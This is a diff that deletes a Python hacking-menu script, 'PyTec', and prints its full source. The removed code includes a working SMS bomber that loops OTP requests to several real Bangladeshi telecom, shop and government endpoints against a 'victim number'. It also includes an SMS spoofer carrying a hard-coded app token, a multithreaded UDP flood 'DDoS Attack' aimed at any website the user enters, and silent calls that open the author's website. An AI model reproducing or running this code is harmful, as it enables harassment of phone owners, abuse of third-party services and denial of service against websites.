@@ -1,1212 +1,229 @@
-import os
-import time
-import requests
-
-# rendom module use kore ans gulu ke sajate pari
-
-
-try:
-    iP = requests.get("http://ip-api.com/json/").json()["query"]
-    mk = requests.get("http://ip-api.com/json/").json()["country"]
-    if "Bangladesh" not in mk:
-       print("\033[1;91m[×] THIS TOOL WORK IN BANGLADESH")
-       time.sleep(3)
-       exit()
-except requests.exceptions.ConnectionError:
-    print(f"\033[1;91m[×] Connection Problem, Please Check Your Internet And Run Again")
-    time.sleep(3)
-    os.system("clear")
-    exit()
-
-
-
-try:
-    import requests
-except ImportError:
-    print('\n  installing Requests ...\n')
-    time.sleep(1)
-    os.system('pip install requests')
-
-# try:
-#     import pyttsx3
-# except ImportError:
-#     print('\n  installing pyttsx3 ...\n')
-#     time.sleep(1)
-#     os.system('pip install pyttsx3')
-
-# try:
-#     import pyautogui
-# except ImportError:
-#     print('\n  installing pyautogui...\n')
-#     time.sleep(1)
-#     os.system('pip install pyautogui')
-
-try:
-    import qrcode
-except ImportError:
-    print('\n  installing qrcode ...\n')
-    time.sleep(1)
-    os.system('pip install qrcode')
-
-try:
-    import pyshorteners
-except ImportError:
-    print('\n  installing pyshorteners ...\n')
-    time.sleep(1)
-    os.system('pip install pyshorteners')
-
-
-# try:
-#     import speech_recognition
-# except ImportError:
-#     print('\n  installing SpeechRecognition ...\n')
-#     time.sleep(1)
-#     os.system('pip install SpeechRecognition')
-#     pass
-
-def rm():
-    com("rm -rf PyTec.py")
-
-# try:
-#     import pywhatkit
-# except ImportError:
-#     print('\n installing pywhatkit...')
-#     time.sleep(1)
-#     os.system('pip install pywhatkit')
-
-
-#import pyttsx3
-# import speech_recognition as sr
-import sys
-from os import system as com
-from time import sleep as sleep
-import time
-#import pyautogui as gui
-import pyshorteners as st
-import random
-import json
-import  requests as re
-# import pywhatkit
-
-
-
-#==================for Color Code===============
-BLK = "\033[0;30m"
-RED = "\033[0;31m"
-GRN = "\033[0;32m"
-YLW = "\033[0;33m"
-BLU = "\033[0;34m"
-PRP = "\033[0;35m"
-CYN = "\033[0;36m"
-WHT = "\033[0;37m"
-
-B_BLK = "\033[1;30m"
-B_RED = "\033[1;31m"
-B_GRN = "\033[1;32m"
-B_YLW = "\033[1;33m"
-B_BLU = "\033[1;34m"
-B_PRP = "\033[1;35m"
-B_CYN = "\033[1;36m"
-B_WHT = "\033[1;37m"
-t="\t" #for tab
-r="\033[1;31m" #for red color  
-g="\033[1;32m" #for green color
-y="\033[1;33m" #for yellow color
-b="\033[1;34m" #for blue color
-m="\033[1;35m" #for purple color
-c="\033[1;36m" #for cyan color
-w="\033[1;37m" #for white color
-
-
-# Random Function
-
-list1 = [GRN, YLW, BLU, PRP, CYN, WHT]
-list2 = [B_GRN, B_YLW, B_BLU, B_PRP, B_CYN, B_WHT]
-ran = str(random.choice(list1))
-ran2 = str(random.choice(list2))
-
-tim = time.strftime("%H:%M:%S") # current time
-
-
-
-#==============animation for============#
-def axak(xak):
-    for x in xak:
-        sys.stdout.write(x)
-        sys.stdout.flush()
-        time.sleep(0.005)
-def xak(xak):
-    for x in xak+"\n":
-        sys.stdout.write(x)
-        sys.stdout.flush()
-        time.sleep(0.010)
-def xak2(xak):
-    for x in xak+"\n":
-        sys.stdout.write(x)
-        sys.stdout.flush()
-        time.sleep(0.07)
-def animation_ban(xak):
-    for x in xak+"\n":
-        sys.stdout.write(x)
-        sys.stdout.flush()
-        time.sleep(0.002)
-
-
-
-
-
-#++++++++++++++++++++Tools menu++++++++++++++++++
-menu_logo = (f"""{ran2}
-╔═══════════════════════════════════════════════════════╗
-║                                                       ║
-║                                                       ║
-║        ██████╗░██╗░░░██╗████████╗███████╗░█████╗░     ║
-║        ██╔══██╗╚██╗░██╔╝╚══██╔══╝██╔════╝██╔══██╗     ║
-║        ██████╔╝░╚████╔╝░░░░██║░░░█████╗░░██║░░╚═╝     ║
-║        ██╔═══╝░░░╚██╔╝░░░░░██║░░░██╔══╝░░██║░░██╗     ║
-║        ██║░░░░░░░░██║░░░░░░██║░░░███████╗╚█████╔╝     ║
-║        ╚═╝░░░░░░░░╚═╝░░░░░░╚═╝░░░╚══════╝░╚════╝░     ║
-║                                                       ║
-╠═══════════════════════════════════════════════════════╣
-║                                                       ║
-║   [1] 🚀 MK SMS BOMBER (Updating)                    ║
-║   [2] 📷 QR Code Generator                           ║
-║   [3] 🔗 URL Shortener                               ║
-║   [4] ✉️ Custom SMS (Updating)                       ║
-║   [5] 🌐 Web Cloner                                  ║
-║   [6] 💥 DDoS Attack                                 ║
-║   [0] ❌ Exit                                        ║
-║                                                       ║
-╚═══════════════════════════════════════════════════════╝
-""")
-com("xdg-open http://mk777.rf.gd/?i=1")
-
-
-
-
-
-
-
-
-
-
-
-
-
-# ==================Only for Banner===================
-
-def pytec():
-    com("clear")
-    xak(f"""{ran2}
-    ╔═══════════════════════════════════════════════════════╗
-    ║                                                       ║
-    ║                                                       ║
-    ║        ██████╗░██╗░░░██╗████████╗███████╗░█████╗░     ║
-    ║        ██╔══██╗╚██╗░██╔╝╚══██╔══╝██╔════╝██╔══██╗     ║
-    ║        ██████╔╝░╚████╔╝░░░░██║░░░█████╗░░██║░░╚═╝     ║
-    ║        ██╔═══╝░░░╚██╔╝░░░░░██║░░░██╔══╝░░██║░░██╗     ║
-    ║        ██║░░░░░░░░██║░░░░░░██║░░░███████╗╚█████╔╝     ║
-    ║        ╚═╝░░░░░░░░╚═╝░░░░░░╚═╝░░░╚══════╝░╚════╝░     ║
-    ║                                                       ║
-    ╚═══════════════════════════════════════════════════════╝
-    """)
-    
-
-
-
-
-
-def sms_bomber_ban():
-    com("clear")
-    xak(f"""\n{ran2}
-    ██████╗░░█████╗░███╗░░░███╗██████╗░███████╗██████╗░
-    ██╔══██╗██╔══██╗████╗░████║██╔══██╗██╔════╝██╔══██╗
-    ██████╦╝██║░░██║██╔████╔██║██████╦╝█████╗░░██████╔╝
-    ██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗██╔══╝░░██╔══██╗
-    ██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝███████╗██║░░██║
-    ╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝ 
-    """ )
-    animation_ban(f"""{ran}
-    ╔═══════════════════════════════════════════════════╗
-    ║                                                   ║
-    ║  🌐  OWNER      ➟  ★彡[𝐌𝐔𝐒𝐋𝐈𝐌 𝐔𝐃𝐃𝐈𝐍 𝐌𝐊]彡★      ║
-    ║  🔧  TOOLS      ➟  𝑺𝑴𝑺 𝑩𝒐𝒎𝒃𝒆𝒓                   ║
-    ║  🛠️  VERSION    ➟  V 1.0                         ║
-    ║  🌐  WEBSITE    ➟  http://mk777.rf.gd/?i=1       ║
-    ║                                                   ║
-    ╚═══════════════════════════════════════════════════╝
-        """ )
-    
-
-def qr_code_ban():
-    com("clear")
-    xak(f"""\n{ran2}
-        
-    ╭━━━┳━━━╮╭━━━╮╱╱╱╱╭╮
-    ┃╭━╮┃╭━╮┃┃╭━╮┃╱╱╱╱┃┃
-    ┃┃╱┃┃╰━╯┃┃┃╱╰╋━━┳━╯┣━━╮
-    ┃┃╱┃┃╭╮╭╯┃┃╱╭┫╭╮┃╭╮┃┃━┫
-    ┃╰━╯┃┃┃╰╮┃╰━╯┃╰╯┃╰╯┃┃━┫
-    ╰━━╮┣╯╰━╯╰━━━┻━━┻━━┻━━╯
-    ╱╱╱╰╯
-    """ )
-    animation_ban(f"""{ran}
-    ╔═══════════════════════════════════════════════════╗
-    ║                                                   ║
-    ║  🌐  OWNER      ➟  ★彡[𝐌𝐔𝐒𝐋𝐈𝐌 𝐔𝐃𝐃𝐈𝐍 𝐌𝐊]彡★      ║
-    ║  🔧  TOOLS      ➟  𝓠𝓡 𝓒𝓸𝓭𝓮 𝓖𝓮𝓷𝓪𝓻𝓮𝓽𝓸𝓻            ║
-    ║  🛠️  VERSION    ➟  V 1.0                         ║
-    ║  🌐  WEBSITE    ➟  http://mk777.rf.gd/?i=1       ║
-    ║                                                   ║
-    ╚═══════════════════════════════════════════════════╝
-        """ )
-    
-def url_shortener_ban():
-    com("clear")
-    xak(f"""\n{ran2}
-    
-    ╔╗ ╔╗ ╔╗   ╔═══╦╗      ╔╗
-    ║║ ║║ ║║   ║╔═╗║║     ╔╝╚╗
-    ║║ ║╠═╣║   ║╚══╣╚═╦══╦╩╗╔╬══╦═╗
-    ║║ ║║╔╣║ ╔╗╚══╗║╔╗║╔╗║╔╣║║║═╣╔╝
-    ║╚═╝║║║╚═╝║║╚═╝║║║║╚╝║║║╚╣║═╣║
-    ╚═══╩╝╚═══╝╚═══╩╝╚╩══╩╝╚═╩══╩╝
-    """)
-    animation_ban(f"""{ran}
-    ╔═══════════════════════════════════════════════════╗
-    ║                                                   ║
-    ║  🌐  OWNER      ➟  ★彡[𝐌𝐔𝐒𝐋𝐈𝐌 𝐔𝐃𝐃𝐈𝐍 𝐌𝐊]彡★      ║
-    ║  🔧  TOOLS      ➟  𝐔𝐫𝐋 𝐒𝐡𝐨𝐫𝐭𝐞𝐫                    ║
-    ║  🛠️  VERSION    ➟  V 1.0                         ║
-    ║  🌐  WEBSITE    ➟  http://mk777.rf.gd/?i=1       ║
-    ║                                                    ║
-    ╚════════════════════════════════════════════════════╝
-        """ )
-
-def custom_sms_ban():
-    com("clear")
-    xak(f"""\n{ran2}
-        
-    ╭━━━╮╱╱╱╱╱╭╮╱╱╱╱╱╱╱╭━━━┳━╮╭━┳━━━╮
-    ┃╭━╮┃╱╱╱╱╭╯╰╮╱╱╱╱╱╱┃╭━╮┃┃╰╯┃┃╭━╮┃
-    ┃┃╱╰╋╮╭┳━┻╮╭╋━━┳╮╭╮┃╰━━┫╭╮╭╮┃╰━━╮
-    ┃┃╱╭┫┃┃┃━━┫┃┃╭╮┃╰╯┃╰━━╮┃┃┃┃┃┣━━╮┃
-    ┃╰━╯┃╰╯┣━━┃╰┫╰╯┃┃┃┃┃╰━╯┃┃┃┃┃┃╰━╯┃
-    ╰━━━┻━━┻━━┻━┻━━┻┻┻╯╰━━━┻╯╰╯╰┻━━━╯
-    """)
-    animation_ban(f"""{ran}
-    ╔═════════════════════════════════════════════════╗
-    ║                                                 ║
-    ║  🌐  OWNER      ➟  ★彡[𝐌𝐔𝐒𝐋𝐈𝐌 𝐔𝐃𝐃𝐈𝐍 𝐌𝐊]彡★    ║
-    ║  🔧  TOOLS      ➟  𝓒𝓾𝓼𝓽𝓸𝓶 𝓢𝓜𝓢                ║
-    ║  🛠️  VERSION    ➟  V 1.0                      ║
-    ║  🌐  WEBSITE    ➟  http://mk777.rf.gd/?i=1    ║
-    ║                                                ║
-    ╚════════════════════════════════════════════════╝
-        """ )
-
-def web_cloner_ban():
-    com("clear")
-    xak(f"""\n{ran2}
-        
-    ╭╮╭╮╭╮╱╱╭╮╱╭━━━┳╮
-    ┃┃┃┃┃┃╱╱┃┃╱┃╭━╮┃┃
-    ┃┃┃┃┃┣━━┫╰━┫┃╱╰┫┃╭━━┳━╮╭━━┳━╮
-    ┃╰╯╰╯┃┃━┫╭╮┃┃╱╭┫┃┃╭╮┃╭╮┫┃━┫╭╯
-    ╰╮╭╮╭┫┃━┫╰╯┃╰━╯┃╰┫╰╯┃┃┃┃┃━┫┃
-    ╱╰╯╰╯╰━━┻━━┻━━━┻━┻━━┻╯╰┻━━┻╯
-    """)
-    animation_ban(f"""{ran}
-    ╔═══════════════════════════════════════════════════╗
-    ║                                                   ║
-    ║  🌐  OWNER      ➟  ★彡[𝐌𝐔𝐒𝐋𝐈𝐌 𝐔𝐃𝐃𝐈𝐍 𝐌𝐊]彡★      ║
-    ║  🔧  TOOLS      ➟  𝓦𝓮𝓫 𝓒𝓵𝓸𝓷𝓮𝓻                  ║
-    ║  🛠️  VERSION    ➟  V 1.0                        ║
-    ║  🌐  WEBSITE    ➟  http://mk777.rf.gd/?i=1      ║
-    ║                                                  ║
-    ╚══════════════════════════════════════════════════╝
-        """ )
-
-def ddos_attack_ban():
-    com("clear")
-    xak(f"""\n {ran2}
-        
-    ██████╗░██████╗░░█████╗░░██████╗
-    ██╔══██╗██╔══██╗██╔══██╗██╔════╝
-    ██║░░██║██║░░██║██║░░██║╚█████╗░
-    ██║░░██║██║░░██║██║░░██║░╚═══██╗
-    ██████╔╝██████╔╝╚█████╔╝██████╔╝
-    ╚═════╝░╚═════╝░░╚════╝░╚═════╝░
-        """)
-    animation_ban(f"""{ran}
-    ╔══════════════════════════════════════════════════╗
-    ║                                                  ║
-    ║  🌐  OWNER      ➟  ★彡[𝐌𝐔𝐒𝐋𝐈𝐌 𝐔𝐃𝐃𝐈𝐍 𝐌𝐊]彡★     ║
-    ║  🔧  TOOLS      ➟  𝐀𝐔𝐓𝐎 𝐃𝐃𝐨𝐒 𝐛𝐲 𝐏𝐲𝐓𝐞𝐜🔥          ║
-    ║  🛠️  VERSION    ➟  V 1.0                        ║
-    ║  🌐  WEBSITE    ➟  http://mk777.rf.gd/?i=1      ║
-    ║                                                  ║
-    ╚══════════════════════════════════════════════════╝
-        """ )
-    
-          
-
-
-
-
-
-
-
-#===================BOMBER TOOLS=======================
-
-def sms_bomber():
-  com("clear")
-  sms_bomber_ban()
-  xak(f"{ran2} 𝐒𝐨𝐫𝐫𝐲, 𝐓𝐡𝐢𝐬 𝐓𝐨𝐨𝐥 𝐢𝐬 𝐧𝐨𝐭 𝐰𝐨𝐫𝐤𝐢𝐧𝐠 𝐫𝐢𝐠𝐡𝐭 𝐧𝐨𝐰. 𝐓𝐡𝐢𝐬 𝐢𝐬 𝐜𝐮𝐫𝐫𝐞𝐧𝐭𝐥𝐲 𝐛𝐞𝐢𝐧𝐠 𝐮𝐩𝐝𝐚𝐭𝐞𝐝.")
-  xak2(f"{ran} 𝐖𝐞 𝐚𝐫𝐞 𝐛𝐚𝐜𝐤 𝐭𝐨 𝐦𝐞𝐧𝐮.")
-  menu()
-  print(WHT+"[~] please wait Internet checking...  ")
-  time.sleep(2)
-  try:
-    iP = requests.get("http://ip-api.com/json/").json()["query"]
-    mk = requests.get("http://ip-api.com/json/").json()["country"]
-    if "Bangladesh" not in mk:
-       print("\033[1;91m[×] THIS TOOL WORK IN BANGLADESH")
-       time.sleep(3)
-       exit()
-  except requests.exceptions.ConnectionError:
-    print(f"\033[1;91m[×] Connection Problem, Please Check Your Internet And Run Again")
-    time.sleep(3)
-    com("clear")
-    exit()
-  com('clear')
-  print(WHT+"[~] Connecting To The Internet")
-  time.sleep(0.30)
-  print(f"\n{r}Note : {WHT}1 Sms Can Sent Up To 18 sms !!")
-  try:
-   request = requests.get("https://www.google.com/", timeout=2)
-   print("\n\033[1;37m[\033[1;32m#\033[1;37m]"+"\033[1;32m Connetcted ")
-  except (requests.ConnectionError, requests.Timeout) as exception:
-   print("\n\033[1;37m[\033[1;32m#\033[1;37m] \033[1;31mðŸ˜¢ Your Internet Connection Is Poor !")
-  number=input(f"{c}\n[ VICTIM NUMBER ] :{WHT} +88")
-  amount=int(input(c+"\n[ AMOUNT ] : "+WHT))
-  xak(f"\n\n\t {WHT}<{r}/{WHT}> {g}STAY WITH Mk-777 ;) {WHT}<{r}/{WHT}>\n\n")
-  input(f"\t\t\t{r}Press Enter....")
-  com("clear")
-  url0 = "http://apibeta.iqra-live.com/api/v1/sent-otp/"+number
-  urlf = "https://da-api.robi.com.bd/da-nll/otp/send"
-  headersf = {
-              "Host": "da-api.robi.com.bd",
-              "Connection": "keep-alive",
-              "Content-Length": "24",
-              "sec-ch-ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Android WebView";v="122"',
-              "Accept": "application/json, text/plain, */*",
-              "Content-Type": "application/json",
-              "sec-ch-ua-mobile": "?1",
-              "User-Agent": "Mozilla/5.0 (Linux; Android 11; Phh-Treble vanilla Build/RQ3A.211001.001;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.91 Safari/537.36",
-              "sec-ch-ua-platform": '"Android"',
-              "Origin": "https://onlinesim.robi.com.bd",
-              "X-Requested-With": "mark.via.gp",
-              "Sec-Fetch-Site": "same-site",
-              "Sec-Fetch-Mode": "cors",
-              "Sec-Fetch-Dest": "empty",
-              "Referer": "https://onlinesim.robi.com.bd/",
-              "Accept-Encoding": "gzip, deflate, br, zstd",
-              "Accept-Language": "en-US,en;q=0.9",
-          }
-  dataf= {"msisdn": number}
-  
-  
-  random_alphabet = random.choice('abcdefghijklmnopqrstuvwxyz')
-  urlg = "https://meenabazardev.com/api/front/send/otp"
-  headersg = ({
-              "Host": "meenabazardev.com",
-              "accept": "*/*",
-              "access-control-request-method": "POST",
-              "access-control-request-headers": "authorization,content-type,token",
-              "origin": "https://meenabazaronline.com",
-              "user-agent": "Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.45 Mobile Safari/537.36",
-              "sec-fetch-mode": "cors",
-              "x-requested-with": "mark.via.gp",
-              "sec-fetch-site": "cross-site",
-              "sec-fetch-dest": "empty",
-              "referer": "https://meenabazaronline.com/",
-              "accept-encoding": "gzip, deflate, br",
-              "accept-language": "en-US,en;q=0.9",
-              "Content-Type": "application/json",
-          })
-  datag = json.dumps({
-              "CellPhone": number,
-              "type": random_alphabet
-          })
-  
-  urlgov = "https://training.gov.bd/backoffice/api/user/sendOtp"
-  
-  hedagov = {
-              "Host": "training.gov.bd",
-              "Connection": "keep-alive",
-              "Content-Type": "application/json",
-              "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
-              "Origin": "https://training.gov.bd",
-              "Referer": "https://training.gov.bd/signup",
-              "Accept-Encoding": "gzip, deflate, br",
-              "Accept-Language": "en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7"
-          }
-  datagov = json.dumps({
-              "mobile": number
-          })
-  
-  
-  urlshop = 'https://eshop-api.banglalink.net/api/v1/customer/send-otp'
-  hedashop = {
-              'Host': 'eshop-api.banglalink.net',
-              'Connection': 'keep-alive',
-              'Content-Length': '38',
-              'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
-              'sec-ch-ua-platform': '"Android"',
-              'sec-ch-ua-mobile': '?1',
-              'User-Agent': 'Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36',
-              'Content-Type': 'application/json',
-              'Accept': '*/*',
-              'Origin': 'https://eshop.banglalink.net',
-              'X-Requested-With': 'mark.via.gp',
-              'Sec-Fetch-Site': 'same-site',
-              'Sec-Fetch-Mode': 'cors',
-              'Sec-Fetch-Dest': 'empty',
-              'Referer': 'https://eshop.banglalink.net/',
-              'Accept-Encoding': 'gzip, deflate, br',
-              'Accept-Language': 'en-US,en;q=0.9',
-          }
-  datashop = json.dumps({
-              'type': 'phone',
-              'phone': number
-          })
-  
-  com("xdg-open https://www.facebook.com/profile.php?id=100077752513671")
-  print(f"""\n{ran2}                                                               
-  $$\\      $$\\ $$\\   $$\\       $$$$$$$\\   $$$$$$\\  $$\\      $$\\ $$$$$$$\\  
-  $$$\\    $$$ |$$ | $$  |      $$  __$$\\ $$  __$$\\ $$$\\    $$$ |$$  __$$\\ 
-  $$$$\\  $$$$ |$$ |$$  /       $$ |  $$ |$$ /  $$ |$$$$\\  $$$$ |$$ |  $$ |
-  $$\\$$\\$$ $$ |$$$$$  /        $$$$$$$\\ |$$ |  $$ |$$\\$$\\$$ $$ |$$$$$$$\\ |
-  $$ \\$$$  $$ |$$  $$<         $$  __$$\\ $$ |  $$ |$$ \\$$$  $$ |$$  __$$\\ 
-  $$ |\\$  /$$ |$$ |\\$$\\        $$ |  $$ |$$ |  $$ |$$ |\\$  /$$ |$$ |  $$ |
-  $$ | \\_/ $$ |$$ | \\$$\\       $$$$$$$  | $$$$$$  |$$ | \\_/ $$ |$$$$$$$  |
-  \\__|     \\__|\\__|  \\__|      \\_______/  \\______/ \\__|     \\__|\\_______/ 
-    """)
-  print(f"\n\t      {ran},----------------------------------,")
-  print(f"\t{WHT}      | {RED}    AMOUNT ({g}{amount}{RED}){WHT} |   {RED}   TIME       {WHT}|")
-  print(f"\t      {ran}'----------------------------------'")
-  for i in range(amount):
-    respf = requests.post(urlf, headers=headersf, json=dataf)
-    print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥MK-777🔥 "+WHT+tim)
-    respg = requests.post(urlg, headers=headersg, json=datag)
-    print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥MK-777🔥 "+WHT+tim)
-    resp0 = requests.get(url0)
-    print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥MK-777🔥 "+WHT+tim)
-    respgov = requests.post(urlgov, headers=hedagov, json=datagov)
-    print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥MK-777🔥 "+WHT+tim)
-    respshop = requests.post(urlshop, headers=hedashop, json=datashop)
-    print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥MK-777🔥 "+WHT+tim)
-
-  else: 
-    input(g+"\n\n\t\t\tYour Pogram Finished Press Enter For Continue")
-    
-
-
-
-
-
-def qr_code():
-    com("clear")
-    qr_code_ban()
-
-    name = input(f"{ran2}Type QRCode Name: ")
-    data = input(f"{ran2}Type Data For Generate QRCode: ")
-
-    qr = qrcode.QRCode(
-        version=1,
-        error_correction=qrcode.constants.ERROR_CORRECT_H,
-        box_size=20,
-        border=7,
-    )
-    qr.add_data(data)
-    qr.make(fit=True)
-    make = qr.make_image(fill="green", back_color="lightgreen")
-    make.save(f'{name}--PyTec.png')
-    print(f"Your input Data:> {data}")
-    print("Successfully saved")
-    input("\n\n\t\t\tYour Program Finished. Press Enter To Continue")
-    com("clear")
-    qr_code()
-
-
-
-
-
-def url_shortner():
-    com("clear")
-    url_shortener_ban()
-
-    try:
-        urlshort = input(str("ℙ𝕒𝕤𝕥 𝕐𝕠𝕦𝕣 𝕌𝕣𝕝 ℍ𝕖𝕣𝕖 : "))
-        if not urlshort.startswith("http://") and not urlshort.startswith("https://"):
-            print(f"{r}Invalid URL! Please include 'http://' or 'https://'.")
-            return
-
-        shorturl = st.Shortener().tinyurl.short(urlshort)
-        print(f"\n{g}𝘠𝘰𝘶𝘳 𝘚𝘩𝘰𝘳𝘵 𝘜𝘳𝘭 𝘏𝘦𝘳𝘦: {shorturl}")
-    except Exception as e:
-        print(f"{r}An error occurred: {e}")
-    finally:
-        input(g + "\n\n\t\t\tYour Program Finished. Press Enter To Continue...")
-        com("clear")
-        url_shortner()
-
-
-
-
-def custom_sms():
-    com("clear")
-    custom_sms_ban()
-    xak(f"{ran2} 𝐒𝐨𝐫𝐫𝐲, 𝐓𝐡𝐢𝐬 𝐓𝐨𝐨𝐥 𝐢𝐬 𝐧𝐨𝐭 𝐰𝐨𝐫𝐤𝐢𝐧𝐠 𝐫𝐢𝐠𝐡𝐭 𝐧𝐨𝐰. 𝐓𝐡𝐢𝐬 𝐢𝐬 𝐜𝐮𝐫𝐫𝐞𝐧𝐭𝐥𝐲 𝐛𝐞𝐢𝐧𝐠 𝐮𝐩𝐝𝐚𝐭𝐞𝐝.")
-    xak2(f"{ran} 𝐖𝐞 𝐚𝐫𝐞 𝐛𝐚𝐜𝐤 𝐭𝐨 𝐦𝐞𝐧𝐮.")
-    menu()
-
-    urlsms = "https://badhan-api.stylezworld.net/api/otp/store"
-    headers = {
-        "user-agent": "Dart/3.1 (dart:io)",
-        "access-control-allow-credentials": "true",
-        "access-control-allow-headers": "Origin,Content-Type,X-Amz-Date,Authorization,X-Api-Key,X-Amz-Security-Token,locale",
-        "accept": "application/json",
-        "access-control-allow-origin": "*",
-        "access-control-allow-methods": "POST, OPTIONS",
-        "accept-encoding": "gzip",
-        "app-access-token": "mWR+64IbKwxM2XCyJbMvUSCcc=",
-        "content-type": "application/json; charset=utf-8",
-    }
-
-    while True:
-        numsms = str(input(f"\n{g}Enter Victime Number \n \n{WHT}NUMBER {r}=>{y} "))
-        sms = str(input(f"\n{g}Write Message \n \n{WHT}MESSEGE {r}=>{y} "))
-        data = {
-            "phone_number": numsms,                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
-            "registration_phone_number": numsms,
-            "auto_fill": sms
-        }
-        response = requests.post(urlsms, headers=headers, json=data)
-        print("\n", response.json(), "\n\n")
-        input(g + "\n\n\t\t\tYour Program Finished. Press Enter To Continue...")
-        com("clear")
-        url_shortner()
-
-
-
-
-def web_clone():
-    com("clear")
-    web_cloner_ban()
-
-    url = input("𝐄𝐧𝐭𝐞𝐫 𝐔𝐫𝐥 𝐎𝐟 𝐓𝐚𝐫𝐠𝐞𝐭 𝐖𝐞𝐛𝐬𝐢𝐭𝐞: ")
-    response = re.get(url)
-
-    html = response.text
-    css = response.text
-    javascript = response.text
-    print(html)
-    print(css)
-    print(javascript)
-    input(g + "\n\n\t\t\tYour Program Finished. Press Enter To Continue...")
-    com("clear")
-    web_clone()
-
-
-
-
-
-def ddos():
-    com("clear")
-    ddos_attack_ban()
-    xak(f"""\n{ran2} 𝐈 𝐡𝐚𝐯𝐞 𝐭𝐰𝐨 𝐃𝐃𝐎𝐒 𝐭𝐨𝐨𝐥𝐬. 𝐒𝐞𝐥𝐞𝐜𝐭 𝐭𝐡𝐞 𝐭𝐨𝐨𝐥 𝐲𝐨𝐮 𝐩𝐫𝐞𝐟𝐞𝐫. 
-            [𝟏] 𝐌𝐞𝐝𝐢𝐮𝐦 𝐋𝐞𝐯𝐞𝐥
-            [𝟐] 𝐇𝐢𝐠𝐡 𝐋𝐞𝐯𝐞𝐥
-        """)
-    choice = input(f"{ran2}Select Option: ")
-    if choice == "1":
-        ddos_midium()
-    elif choice == "2":
-        ddos_high()
-    else:
-        print(f"{r}Invalid choice. Please select 1 or 2.")
-        ddos()
-    input(g + "\n\n\t\t\tYour Program Finished. Press Enter To Continue...")
-
-
-
-
-
-
-def ddos_midium():
-    com("clear")
-    import os
-    import socket
-    import threading
-    import random
-    import time
-    from urllib.parse import urlparse
-    from datetime import datetime
-
-    # 🌈 Colors
-    red = "\033[91m"
-    green = "\033[92m"
-    cyan = "\033[96m"
-    yellow = "\033[93m"
-    reset = "\033[0m"
-
-    def loading(message, dots=3, delay=0.4):
-        print(f"{yellow}{message}", end="", flush=True)
-        for _ in range(dots):
-            print(".", end="", flush=True)
-            time.sleep(delay)
-        print(reset)
-
-    # 🔰 Clear & Banner
-    os.system("clear" if os.name == "posix" else "cls")
-    ddos_attack_ban()
-
-    # 🌐 Step 1: Input website
-    target_url = input(f"{cyan}[?] Enter Website URL (e.g., https://example.com): {reset}")
-    loading("Parsing URL")
-
-    # 🌍 Step 2: Extract domain and get IP
-    domain = urlparse(target_url).netloc or urlparse(target_url).path
-    loading(f"Resolving IP for {domain}")
-    try:
-        ip = socket.gethostbyname(domain)
-        print(f"{green}[+] Target IP: {ip}{reset}")
-    except Exception as e:
-        print(f"{red}[!] Failed to resolve IP: {e}{reset}")
-        exit()
-
-    # 🔌 Step 3: Detect Port
-    default_port = 443 if "https" in target_url else 80
-    print(f"{green}[+] Using Port: {default_port}{reset}")
-    time.sleep(1)
-
-    # 🧠 Step 4: User config
-    threads = int(input(f"{cyan}[?] Number of Threads (Recommended: 100): {reset}"))
-    loading("Starting attack engine")
-
-    # 💥 DDoS Attack + Live Counter
-    attack_counter = 0
-    lock = threading.Lock()
-    start_time = datetime.now()
-
-    def attack():
-        global attack_counter
-        data = random._urandom(1024)
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        while True:
-            try:
-                s.sendto(data, (ip, default_port))
-                with lock:
-                    attack_counter += 1
-            except Exception:
-                break
-
-    def live_status():
-        while True:
-            time.sleep(1)
-            elapsed = datetime.now() - start_time
-            with lock:
-                print(f"{cyan}[~] Sent packets: {attack_counter} | Time Elapsed: {elapsed.seconds}s{reset}", end="\r",
-                      flush=True)
-
-    print(f"{red}[*] Attacking {ip}:{default_port} with {threads} threads!{reset}")
-    time.sleep(1)
-
-    status_thread = threading.Thread(target=live_status, daemon=True)
-    status_thread.start()
-
-    for _ in range(threads):
-        t = threading.Thread(target=attack)
-        t.start()
-
-
-
-def ddos_high():
-    ddos_attack_ban()
-    animation_ban(f"{ran} 𝐓𝐡𝐢𝐬 𝐢𝐬 𝐚 𝐩𝐨𝐰𝐞𝐫𝐟𝐮𝐥 𝐭𝐨𝐨𝐥. 𝐈𝐭 𝐢𝐬 𝐧𝐨𝐭 𝐩𝐨𝐬𝐬𝐢𝐛𝐥𝐞 𝐭𝐨 𝐫𝐮𝐧 𝐭𝐡𝐢𝐬 𝐭𝐨𝐨𝐥 𝐰𝐢𝐭𝐡𝐨𝐮𝐭 𝐩𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧. 𝐈𝐟 𝐲𝐨𝐮 𝐰𝐚𝐧𝐭, 𝐲𝐨𝐮 𝐜𝐚𝐧 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐭𝐡𝐞 𝐜𝐫𝐞𝐚𝐭𝐨𝐫 𝐨𝐟 𝐭𝐡𝐞 𝐭𝐨𝐨𝐥.")
